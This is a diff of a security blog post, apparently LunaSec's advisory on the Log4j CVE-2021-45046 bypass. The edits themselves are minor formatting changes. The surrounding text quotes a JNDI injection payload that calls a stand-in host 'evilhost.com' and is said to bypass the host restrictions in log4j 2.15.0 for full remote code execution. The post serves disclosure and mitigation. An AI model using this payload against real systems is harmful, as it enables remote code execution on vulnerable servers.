@@ -34,7 +34,7 @@ Earlier today, the second Log4j vulnerability (CVE-2021-45046), was upgraded fro
 limited RCE has only been proven to be exploitable on macOS at the moment. We expect, in time, that other operating systems
 will also be shown to be exploitable.~~ Update: More operating systems have been showing to be vulnerable: MacOS, Fedora, Arch Linux, and Alpine Linux.
 
-See the bottom of this post for an example exploit payload that bypasses the checks in `log4j` `2.15.0`.
+See the bottom of this post for an example exploit payload that bypasses the checks in log4j `2.15.0`.
 
 **Just trying to patch Log4Shell? Please read our dedicated
 [Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).**
@@ -64,7 +64,7 @@ In this post, we're going to talk about the impact of these changes, and about w
 
 <!--truncate-->
 
-## Understanding the New Bypass
+## Understanding the new bypass
 
 With more attention on the Log4j library now from the security community, we have seen security researchers digging into the
 source code of this project. @pwntester [announced on Twitter](https://twitter.com/pwntester/status/1471465662975561734)
@@ -124,7 +124,7 @@ new bypasses. (Updated 12/19 due to new DOS found in `2.16.0`. Please upgrade to
 The bypass was [posted](https://twitter.com/marcioalm/status/1471740771581652995) on Twitter by Márcio Almeida early on
 December 17th.
 
-This payload will bypass the network host restrictions in `log4j` `2.15.0` and allow full RCE again:
+This payload will bypass the network host restrictions in log4j `2.15.0` and allow full RCE again:
 ```
 ${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
 ```
